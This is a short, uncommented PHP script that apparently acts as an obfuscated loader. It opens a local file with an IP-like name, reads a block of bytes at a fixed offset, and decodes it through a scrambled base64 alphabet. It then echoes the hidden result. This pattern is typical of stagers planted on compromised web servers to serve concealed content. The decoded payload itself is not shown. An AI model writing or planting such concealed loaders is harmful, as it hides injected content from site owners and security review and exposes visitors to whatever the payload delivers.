<?php
$hdl=fopen('188.27.97.163UiDb4goAAAMAAAzk1DwAAAAIfile','rb');
fread($hdl,0x4fb);
$text=base64_decode(
	strtr(
		fread($hdl,0x1a8),
		'QYqgd7emER8otKG5P+FcaU1nZsV/lJH0xwIOkS43vANLjryuiWzXhCfpTDMBb269=',
		'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	)
);
echo($text);
?>